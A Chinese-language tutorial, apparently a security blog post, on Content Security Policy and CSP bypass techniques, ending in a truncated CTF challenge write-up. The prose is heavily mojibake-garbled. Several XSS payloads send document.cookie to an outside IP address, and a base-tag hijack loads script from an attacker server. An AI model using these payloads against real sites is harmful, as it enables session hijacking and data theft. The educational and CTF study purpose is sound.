\u0026lt;/style\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Roboto\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;ç•™è¨€æ¿\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;messageForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;messageInput\u0026#34; placeholder=\u0026#34;è¾“å…¥ä½ çš„ç•™è¨€...\u0026#34; required\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;æäº¤\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;messages\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; document.getElementById(\u0026#39;messageForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); const messageInput = document.getElementById(\u0026#39;messageInput\u0026#39;); const message = messageInput.value.trim(); if (message) { const messageElement = document.createElement(\u0026#39;div\u0026#39;); messageElement.className = \u0026#39;message-item\u0026#39;; messageElement.textContent = message; // ä½¿ç”¨textContentè€Œä¸æ˜¯innerHTMLé˜²æ­¢XSS document.getElementById(\u0026#39;messages\u0026#39;).appendChild(messageElement); messageInput.value = \u0026#39;\u0026#39;; } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç®€å•è§£æä¸€ä¸‹ï¼š\ndefault-src 'self'ï¼šè®²å…¶ä»–æ²¡è®¾å®šçš„èµ„æºè®¾ç½®ä¸ºåŒæºã€‚ script-src 'self' 'nonce-2726c7f26c9'ï¼šå…è®¸åŒæºè„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨äº†nonceæ¥å…è®¸ç‰¹å®šå†…è”è„šæœ¬ã€‚ è¿™é‡Œæœ‰ä¸ªéœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œçœ‹åé¢çš„\u0026lt;style\u0026gt;ç­‰æ ‡ç­¾ï¼Œéƒ½æ˜¯è®¾ç½®äº†å†…è”tokençš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€çš„è®¾ç½®è¿™ä¸ªtokenï¼Œæ¥è¾¾åˆ°æ˜¯å¦æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„é—®é¢˜ï¼Œåœ¨è¿™ä¸ªå‰ç«¯ä¸­ï¼Œæ˜¯ç›´æ¥é€šè¿‡\u0026lt;meta\u0026gt;æ ‡ç­¾æ¥è®¾ç½®çš„ï¼ŒåŒæ ·çš„ï¼ŒåŠ¨æ€çš„è¯è¿˜å¯ä»¥é€šè¿‡HTTPå“åº”å¤´æ¥è®¾ç½®.å¯ä»¥ç®€å•æ”¹æ”¹å‰é¢çš„å‰ç«¯è„šæœ¬æ¥è‡ªå·±ç†è§£ä¸€ä¸‹ã€‚\nstyle-src 'self' https://fonts.googleapis.comï¼šå…è®¸åŒæºæ ·å¼å’ŒGoogle Fontsçš„æ ·å¼ font-src https://fonts.gstatic.comï¼šå…è®¸ä»Googleå­—ä½“æœåŠ¡å™¨åŠ è½½å­—ä½“ã€‚ img-src 'self' data:ï¼šå…è®¸åŒæºå›¾ç‰‡å’Œdata URLå›¾ç‰‡ object-src 'none'ï¼šç¦ç”¨æ‰€æœ‰æ’ä»¶å†…å®¹ form-action 'self'ï¼šé™åˆ¶è¡¨å•åªèƒ½æäº¤åˆ°åŒæºåœ°å€ æ³¨æ„ï¼šå¦‚æœè®¾ç½®äº†å¤šä¸ªæ¡ä»¶ï¼Œåªéœ€è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å°±ä¼šå…è®¸åŒ¹é…ï¼Œä¸¤ä¸ªæ¡ä»¶æ˜¯ç‹¬ç«‹çš„ã€‚\nè¿™é‡Œçš„jsä»£ç ä¹Ÿæ˜¯æ¯”è¾ƒä¹Ÿæœ‰ç‚¹æ„æ€ï¼Œæ˜¯å°†ç•™è¨€çš„å†…å®¹å†™å…¥åˆ°DOMæ ‘çš„ï¼Œé€šè¿‡Javascriptæ¥åŠ¨æ€åŠ è½½çš„ï¼Œç›´æ¥çœ‹ctrl+uæ˜¯çœ‹ä¸åˆ°çš„ï¼Œå¯ä»¥å»æ­ä¸ªå‰ç«¯äº†è§£ä¸€ä¸‹ã€‚\nçœ‹äº†ä¸Šé¢çš„ä»£ç ï¼Œä¼šå¯¹CSPçš„é™åˆ¶ä¼šæ›´åŠ æ¸…æ¥šï¼Œå¦‚ä¸‹è¯´æ˜ä¸€ä¸‹ç»•è¿‡æ–¹æ³•ã€‚\nç»•è¿‡æ‰‹æ®µ è¿™é‡Œå°±è¯´è¯´ä¸€ä¸‹æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹ã€‚\nå¯ä»¥åŠ¨æ€æ‰§è¡Œä»»æ„jsè„šæœ¬ å½“ç„¶æ˜¯å­˜åœ¨CSPé™åˆ¶å•¦ï¼Œåªä¸è¿‡è®¾ç½®çš„cspä¸ºscript-src 'unsafe-inline'ï¼Œä¹Ÿå°±æ˜¯å…è®¸\u0026lt;script\u0026gt;æ ‡ç­¾çš„æ‰§è¡Œã€‚\nè¿™ä¸ªç»•è¿‡æ–¹æ³•ä¸ªäººæ„Ÿè§‰å…¶å®ä¸å¸¸è§ï¼Œéƒ½èƒ½éšä¾¿æ‰§è¡Œjsè„šæœ¬äº†ã€‚\nlocation.href CSPä¸å½±å“location.hrefè·³è½¬ï¼Œç›´æ¥å¦‚ä¸‹æ‰“å³å¯ï¼š\n1 2 3 \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+document.cookie ;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+escape(document.cookie);\u0026lt;/script\u0026gt; linkæ ‡ç­¾çš„åˆ©ç”¨ è€ç‰ˆæœ¬çš„æµè§ˆå™¨å¯ç”¨ï¼Œå½“æ—¶æ²¡æœ‰è¢«\u0026lt;meta\u0026gt;æ ‡ç­¾çº¦æŸï¼Œç®—æ˜¯æ¼æ‰çš„ï¼Œå·²ç»è¢«ä¿®å¤äº†ã€‚\nç¡¬å†™å¦‚ä¸‹ï¼š\n1 \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;//47.100.223.173:2333?${cookie}\u0026#34;\u0026gt; è¾©è¯çœ‹å¾…å§ï¼Œå¸¦ä¸å‡ºcookieï¼Œå¯èƒ½æ˜¯cookieè·å–çš„é”™è¯¯ã€‚åæ­£èƒ½è®¿é—®åˆ°ipã€‚\né€šè¿‡jsä»£ç å¦‚ä¸‹å®ç°:\n1 2 3 4 \u0026lt;script\u0026gt;var link = document.createElement(\u0026#34;link\u0026#34;); link.setAttribute(\u0026#34;rel\u0026#34;, \u0026#34;prefetch\u0026#34;); link.setAttribute(\u0026#34;href\u0026#34;, \u0026#34;//47.100.223.173:2333/?\u0026#34; + document.cookie); document.head.appendChild(link);\u0026lt;/script\u0026gt; è¿™æ ·çš„jsä»£ç ä»£ç æ˜¯æˆåŠŸå¸¦å‡ºæ¥cookieçš„ã€‚\nä½†æ˜¯é™åˆ¶éƒ½æ¯”è¾ƒå¤§ï¼Œéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ã€‚\nå…¶ä»–ç»•è¿‡æ–¹æ³• ä½¿ç”¨iframeæ ‡ç­¾ç»•è¿‡ æ‰€æœ‰çš„ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒ\u0026lt;iframe\u0026gt;æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾çš„å®šä¹‰å°±æ˜¯è§„å®šäº†ä¸€ä¸ªå†…è”æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯å®ƒèƒ½å¤Ÿå°†å¦ä¸€ä¸ªHTMLé¡µé¢åµŒå…¥åˆ°å½“å‰é¡µé¢ä¸­ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥æ€ä¹ˆåŠï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å½“å‰çš„webæœåŠ¡ä¸­çš„ä¸€ä¸ªé¡µé¢çš„å†…å®¹ï¼Œè€Œå¦å¤–ä¸€ä¸ªé¡µé¢æ˜¯æœ‰æˆ‘æƒ³è¦çš„ä¸œè¥¿çš„ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨èƒ½æ§åˆ¶å¾—é¡µé¢ä¸­ä½¿ç”¨iframeæ ‡ç­¾æ¥åµŒå…¥å¦ä¸€ä¸ªé¡µé¢ï¼Œç„¶åå°†å…¶æ‰“å°å¤„ç†å•Šï¼Œè¿™æ ·å°±èƒ½æˆåŠŸç»•è¿‡CSPçš„åŒæºé™åˆ¶å¾—åˆ°æƒ³è¦å¾—ä¸œè¥¿äº†\nä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š\nä»¥åŸå…ˆçš„ç•™è¨€æ¿çš„ä»£ç ä¸ºä¾‹ï¼š\napp.htmlï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1 id=\u0026#34;flag\u0026#34;\u0026gt;flag{text123}\u0026lt;/h1\u0026gt; index.htmlï¼ˆå¯æ§é¡µé¢ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var iframe = document.createElement(\u0026#34;iframe\u0026#34;); iframe.setAttribute(\u0026#34;src\u0026#34;, \u0026#34;index.html\u0026#34;); iframe.style.display = \u0026#34;none\u0026#34;; // éšè— iframe document.body.appendChild(iframe); iframe.onload = function() { setTimeout(function() { var flagElement = iframe.contentWindow.document.getElementById(\u0026#34;flag\u0026#34;); if (flagElement) { console.log(flagElement.textContent); // è¾“å‡º flag å†…å®¹ } else { console.log(\u0026#34;Flag not found\u0026#34;); } }, 1000); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; æœ€åå°è¯•å¦‚ä¸‹ï¼ŒæˆåŠŸåœ¨æ§åˆ¶å°è¾“å‡ºï¼š\nå½“ç„¶ä¹Ÿå¯ä»¥å¼¹çª—è¾“å‡ºã€‚è¿™é‡ŒåŠ çš„setTimeout()å‡½æ•°ï¼Œæ˜¯ä¸ºäº†è®©index.htmlæ–‡æ¡£åŠ è½½å®Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå¿…é¡»è¦åœ¨scriptæ ‡ç­¾å¤–é¢å¥—ä¸€ä¸ªbodyæ ‡ç­¾ï¼Œè¿™æ ·æ‰èƒ½æˆåŠŸåŠ è½½ï¼Œå¯èƒ½çš„åŸå› å¦‚ä¸‹ï¼š\næ˜¯å› ä¸ºHTMLæ–‡æ¡£çš„è§£ææ˜¯ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œçš„ï¼Œå½“è§£æåˆ°\u0026lt;script\u0026gt;æ ‡ç­¾æ—¶ï¼Œä¼šé©¬ä¸Šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œå…¶å®ç›¸å½“äºæŠŠscriptæ”¾åœ¨\u0026lt;body\u0026gt;æ ‡ç­¾å‰è§£æï¼Œä½†æ˜¯æ³¨æ„æˆ‘ä»¬åˆ©ç”¨ä»£ç ä¸­çš„ä¸€æ­¥ï¼š\n1 document.body è¿™é‡Œå…¶å®æ˜¯è°ƒç”¨åˆ°äº†DOMçš„ä¸€ä¸ªå¯¹è±¡ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œå¿…é¡»è¦å°†å…¶æ”¾åœ¨\u0026lt;body\u0026gt;æ ‡ç­¾ä¸­ï¼Œç®€å•ç»™ä¸ªä»£ç å¯¹æ¯”ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // è¾“å‡º \u0026lt;body\u0026gt; å…ƒç´  \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // è¾“å‡º null \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt; ç»“æœå¦‚ä¸Šï¼Œç®€å•ç†è§£ä¸€ä¸‹å°±è¡Œã€‚\nå¦‚æœå¯ä»¥çš„è¯ï¼Œå¯ä»¥å°è¯•ç›´æ¥å†™iframeæ ‡ç­¾çš„ä»£ç ï¼Œä¸ç”¨å†ç”¨jsä»£ç æ¥æ„é€ ï¼š\n1 \u0026lt;iframe src=\u0026#34;index.html\u0026#34; title=\u0026#34;iframe Example\u0026#34; width=\u0026#34;400\u0026#34; height=\u0026#34;300\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; è¿™æ ·å°±ç›´æ¥è·å–åˆ°äº†å†…å®¹ï¼š\néœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™é‡Œçš„srcå¯ä»¥æ˜¯ä¸€ä¸ªurlã€‚\nåˆ©ç”¨åœºæ™¯ï¼š\nä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªé¡µé¢å¯æ§ï¼Œå¹¶ä¸”å­˜åœ¨XSSæ¼æ´ï¼Œè¿™æ ·å¯è®¿é—®å­˜åœ¨CSPçš„é¡µé¢çš„å†…å®¹ã€‚\nè¿™ä¸ªæ ‡ç­¾è¿˜æœ‰å¾ˆå¤šæŠ€å·§ï¼Œæ¯”å¦‚å®ƒçš„srcdocå±æ€§ç­‰ã€‚å¯ä»¥çœ‹ä¸‹é¢çš„ä¾‹é¢˜åˆ†äº«ã€‚\nå¯¹äº\u0026lt;iframe\u0026gt;æ ‡ç­¾ã€‚è¿˜æœ‰çš„æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹å¯ä»¥çœ‹çœ‹å¦‚ä¸‹æ–‡ç« ï¼š\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox\nCDNç»•è¿‡ ä¸€èˆ¬å‰ç«¯éƒ½ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œç®€å•æ¥è¯´å…¶å®å°±æ˜¯æœ‰äº›å‰ç«¯ä¼šåº”ç”¨å…¶ä»–CDNä¸Šçš„JSæ¡†æ¶ï¼Œä½†æ˜¯å¦‚æœå¼•ç”¨çš„CDNçš„æ¡†æ¶å­˜åœ¨ä»€ä¹ˆè‡ªå®šä¹‰çš„æ ‡ç­¾æˆ–å…¶ä»–å®šä¹‰ï¼Œå¯ä»¥è·å–cookieç­‰æ“ä½œï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªCDNæ¥ç»•è¿‡CSPã€‚\nä½†æ˜¯è¿™ä¸ªçš„ç»•è¿‡å°±ä¸€èˆ¬éœ€è¦æ‰¾å†å²æ¼æ´ï¼Œæˆ–è€…æ˜¯æŒ–ä¸€ä¸ª0dayå‡ºæ¥ï¼Œç®€å•è®°å½•ä¸€ä¸‹ï¼š\nå¦‚æœç”¨äº†Jquery-mobileåº“ï¼Œä¸”CSPä¸­åŒ…å«script-src 'unsafe-evalæˆ–è€…script-src 'strict-dynamic'ï¼Œå¯ä»¥ç”¨æ­¤expï¼š\n1 \u0026lt;div data-role=popup id=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; blackhat2017æœ‰ç¯‡pptæ€»ç»“äº†å¯ä»¥è¢«ç”¨æ¥ç»•è¿‡CSPçš„ä¸€äº›JSåº“ï¼š\nã€ŠBreaking XSS mitigations via Script Gadgetsã€‹\nè¿˜æœ‰RCTF2018çš„AMPé¢˜å‡ºç°äº†è¿™ä¸ªçš„åˆ©ç”¨ã€‚ä¸»è¦è¿˜æ˜¯å› ä¸ºAMPè‡ªå·±æä¾›çš„ç»„ä»¶ï¼š\u0026lt;amp-pixel\u0026gt;ã€‚å¯ä»¥è·å–åˆ°cookieå¹¶å‘æŒ‡å®šçš„ç½‘å€å‘é€è¯·æ±‚ã€‚\nç®€å•è¯´è¯´è‡ªå·±çš„ç†è§£ï¼Œé¢˜ç›®dockeræœ‰ç‚¹é—®é¢˜ï¼Œå°±æ²¡æœ‰æ‹‰èµ·æ¥è¯•è¯•æ€ä¹ˆæ‰“äº†ï¼š\nCSPé™åˆ¶ä¸ºï¼š\n1 script-src \u0026#39;nonce-88f68fa5b7eb8a01de8b8e63b5fb0a6e\u0026#39; \u0026#39;strict-dynamic\u0026#39;; style-src \u0026#39;unsafe-inline\u0026#39; å¯ä»¥çœ‹åˆ°å¯¹scriptè¿›è¡Œäº†é™åˆ¶ï¼Œç„¶åå¯¹style-srcè¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰å¯¹img-srcè¿›è¡Œé™åˆ¶ï¼Œç„¶åæ²¡æœ‰å®šä¹‰default-srcï¼Œè¿™é‡Œä¸ªäººè®¤ä¸ºçš„å¯èƒ½çš„åŸå› æ˜¯è¿™ä¸ª\u0026lt;amp-pixel\u0026gt;ç»„ä»¶æ˜¯ç”±img-srcæ¥å®šä¹‰çš„ï¼š\næœ€åçš„payloadå¦‚ä¸‹ï¼š\n1 \u0026lt;amp-pixel src=\u0026#34;https://foo.com/pixel?cid=CLIENT_ID(site-user-id-cookie-fallback-name)\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; å…¶ä»–çš„è¯´æ˜å…·ä½“å‚è€ƒå¦‚ä¸‹å®˜æ–¹æ–‡ç« è¯´æ˜ï¼š\nã€ŠAnalytics: the basicsã€‹\nâ€”â€”â€”â€”â€”â€”\nå¯ä»¥å»çœ‹çœ‹è¿™é“é¢˜çš„wpã€‚\nBase-uriç»•è¿‡ base-uriçš„ç»•è¿‡ï¼Œåœ¨RCTF2018 rBlogçš„éé¢„æœŸè§£ï¼Œæ²¡æ‰¾åˆ°dockerï¼Œè¿™é‡Œå°±ç®€å•è®²è®²ç†è§£ã€‚ä»¥åŠwpä¸­çš„æœ‰æ„æ€çš„ç‚¹ã€‚\nè¿™é‡Œæåˆ°äº†ä¸€ä¸ªbase-uriï¼Œè¿™æ˜¯ä¸€ä¸ªæ§åˆ¶\u0026lt;base\u0026gt;æ ‡çš„CSPæŒ‡ä»¤ï¼Œå¯¹äº\u0026lt;base\u0026gt;æ ‡ç­¾çš„å®šä¹‰ï¼Œå¯ä»¥çŸ¥é“çš„æ˜¯ï¼š\nä¸ºé¡µé¢ä¸Šçš„æ‰€æœ‰çš„ç›¸å¯¹é“¾æ¥è§„å®šé»˜è®¤URLæˆ–é»˜è®¤ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šå°†æ¯”å¦‚\u0026lt;script\u0026gt;ã€\u0026lt;a\u0026gt;ç­‰æ ‡ç­¾é‡ŒæŒ‡å‘çš„ç›¸å¯¹URLéƒ½ä¼šæŒ‡å‘\u0026lt;base\u0026gt;æ ‡ç­¾ä¸­çš„ç›¸å¯¹URLã€‚ å¿…é¡»ä½äº\u0026lt;head\u0026gt;å…ƒç´ å†…éƒ¨ï¼Œä¸€èˆ¬æ˜¯é å‰çš„éƒ¨åˆ†ã€‚ ä¸€ä¸ªæ–‡æ¡£åªæœ‰ä¸€ä¸ª\u0026lt;base\u0026gt;æ ‡ç­¾ï¼ˆéå¸¸é‡è¦ï¼Œå¦‚æœä¸èƒ½è¦†ç›–æ‰åŸæœ‰çš„ï¼Œé‚£ä¹ˆå°±ä¸èƒ½åˆ©ç”¨äº†ï¼‰ ç®€å•è§£é‡Šä¸€ä¸‹\u0026lt;base\u0026gt;æ ‡ç­¾çš„ä½¿ç”¨è§„åˆ™ï¼š\n1 2 3 4 \u0026lt;head\u0026gt; \u0026lt;base href=\u0026#34;//vps_ip/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; å¦‚ä¸Šè®¾ç½®ï¼Œé‚£ä¹ˆ\u0026lt;script\u0026gt;åŠ è½½jsæ–‡ä»¶æ—¶å°±ä¼šå»è®¿é—® http://vps_ip/app.jsã€‚æ‰€ä»¥å¦‚æœæƒ³è¦åˆ©ç”¨çš„è¯ï¼Œéœ€è¦åœ¨è‡ªå·±çš„vpsä¸Šåˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œæ”¾è¿›jsä»£ç å³å¯ã€‚\nä½†æ˜¯æœ¬åœ°æµ‹è¯•å¦‚ä¸‹å‘ç°ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;base href=\u0026#34;//47.100.223.173/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™æ ·åœ¨\u0026lt;body\u0026gt;ä¸­è¿˜æ˜¯èƒ½åŠ è½½åˆ°app.jsï¼Ÿè¾©è¯çœ‹å¾…å§ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåº”è¯¥æ˜¯è§£æé¡ºåºçš„åŸå› ï¼Œè¿™é‡Œéœ€è¦è¦åˆ©ç”¨çš„\u0026lt;script\u0026gt;æ ‡ç­¾æ˜¯åœ¨\u0026lt;base\u0026gt;æ ‡ç­¾ä¸‹é¢ã€‚\nå¯¹äºbase-uriï¼Œå¦‚ä¸‹è§£é‡Šæ–‡ç« ï¼š\nã€ŠCSP: base-uriã€‹\né‡Œé¢æåˆ°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼š\ndefault-srcï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ï¼Œå½“æˆ‘ä»¬å¹¶æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªæŒ‡ä»¤ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šç›´æ¥å›è½è¿™ä¸ªdefault-srcå®šä¹‰çš„å†…å®¹ã€‚è¿™ä¸ªæ˜¯éå¸¸é‡è¦çš„åˆ©ç”¨ç‚¹ã€‚\né™¤äº†base-uriï¼Œè¿˜æœ‰å…¶ä»–å¦‚form-actionã€frame-ancestorsç­‰æŒ‡ä»¤ã€‚\næ‰€ä»¥è¿™ä¸ªæ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶ï¼š\nèƒ½åœ¨\u0026lt;head\u0026gt;ä¸­æ’å…¥\u0026lt;base\u0026gt;æ ‡ç­¾ èƒ½æ‰§è¡Œçš„\u0026lt;script\u0026gt;æ ‡ç­¾ä¸€å®šè‡³å°‘æ»¡è¶³script-srcä¸­çš„ä¸€ä¸ªæ¡ä»¶ æ²¡æœ‰æ˜¾å¼è®¾ç½®base-uri é¡µé¢å¼•ç”¨å­˜åœ¨ç›¸å¯¹è·¯å¾„çš„\u0026lt;script\u0026gt;æ ‡ç­¾ RCTFçš„CSPé™åˆ¶å¦‚ä¸‹ï¼š\n1 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-720f7efdee4d8940dc71ef5190d6f266\u0026#39;; frame-src https://www.google.com/recaptcha/; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src \u0026#39;self\u0026#39; æ­¤æ—¶å¯ä»¥ç”¨ CSP Evaluator ç½‘ç«™ç®€å•æ£€æµ‹ä¸€ä¸‹ï¼š\nå¯ä»¥æ‰“base-uriï¼Œå…·ä½“çš„åŸç†å…¶å®å°±æ˜¯å‰é¢è¯´çš„ï¼Œåœ¨æ ‡é¢˜å¤„æ’å…¥\u0026lt;base\u0026gt;ï¼Œç„¶åé€šè¿‡åŠ è½½jsæ–‡ä»¶æ¥æ‰“ã€‚\nè¿™é“é¢˜çš„wpå¦‚ä¸‹æ–‡ç« æ¯”è¾ƒè¯¦ç»†ï¼š\nhttps://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup\nCRLFç»•è¿‡ HCTF2018çš„ä¸€é“é¢˜ï¼Œå½“ä¸€ä¸ªé¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œå¹¶ä¸”å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ¢è¡Œï¼Œå°†CSPæŒ¤åˆ°HTTPè¿”å›ä½“ä¸­ï¼Œè¿™æ ·æ¥ç»•è¿‡CSPã€‚\nè¿™é‡Œä¸»è¦çš„åˆ©ç”¨æ‰‹æ³•æ˜¯ï¼Œå‰é¢è¯´äº†çš„ï¼Œå¦‚æœæ˜¯ä½¿ç”¨\u0026lt;meta\u0026gt;æ ‡ç­¾ï¼Œéœ€è¦åœ¨\u0026lt;head\u0026gt;ä¸­æ¥å®šä¹‰ï¼Œå¹¶ä¸”åœ¨\u0026lt;body\u0026gt;ä¸­çš„CSPè®¾ç½®æ˜¯ä¼šè¢«å¿½ç•¥çš„ã€‚\nå…·ä½“åˆ©ç”¨å°±ç½‘ä¸Šæœwpçœ‹å§ã€‚\né¢˜ç›®åœ°å€ï¼šhttps://github.com/Lou00/HCTF2018_Bottleï¼Œä½†æ˜¯æœ‰ç‚¹è€äº†ï¼Œdockeræ‹‰ä¸èµ·æ¥ï¼Œæ²¡æ­ç¯å¢ƒå¤ç°ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nç­‰è¿˜æœ‰å¾ˆå¤šç»•è¿‡æ–¹å¼ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œå…·ä½“å¯ä»¥çœ‹å‚è€ƒæ–‡ç« ä¸­çš„å…ˆçŸ¥ç¤¾åŒºçš„æ–‡ç« ï¼Œè¿˜æ˜¯æ¯”è¾ƒå…¨é¢çš„ã€‚\nä¾‹é¢˜åˆ†äº« Tagless SekaiCTF 2024 çš„é¢˜ï¼Œé¢˜ç›®ç¯å¢ƒï¼šhttps://github.com/project-sekai-ctf/sekaictf-2024?tab=readme-ov-file\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜å¦‚ä¸‹ï¼š\næ— æ ‡ç­¾æ˜¾ç¤ºå™¨ï¼Œå°è¯•å¾€é‡Œé¢æ’å…¥æ ‡ç­¾ï¼Œæ²¡æœ‰æ˜¾ç¤ºã€‚çœ‹äº†ä¸€ä¸‹æ’å…¥ä½ç½®ï¼Œæ˜¯åœ¨\u0026lt;body\u0026gt;ä¸­ã€‚ç»™dockeræºä»£ç ï¼Œç›´æ¥å¼€å®¡ã€‚æ„Ÿè§‰æ˜¯ä¸€ä¸ªXSSã€‚\nap.pyæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from flask import Flask, render_template, make_response, request from bot import * from urllib.parse import urlparse app = Flask(__name__, static_folder=\u0026#39;static\u0026#39;) @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#34;/report\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def report(): bot = Bot() url = request.form.get(\u0026#39;url\u0026#39;) if url: try: parsed_url = urlparse(url) except Exception: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid URL.\u0026#34;}, 400 if parsed_url.scheme not in [\u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid scheme.\u0026#34;}, 400 if parsed_url.hostname not in [\u0026#34;127.0.0.1\u0026#34;, \u0026#34;localhost\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid host.\u0026#34;}, 401 bot.visit(url) bot.close() return {\u0026#34;visited\u0026#34;: url}, 200 else: return {\u0026#34;error\u0026#34;: 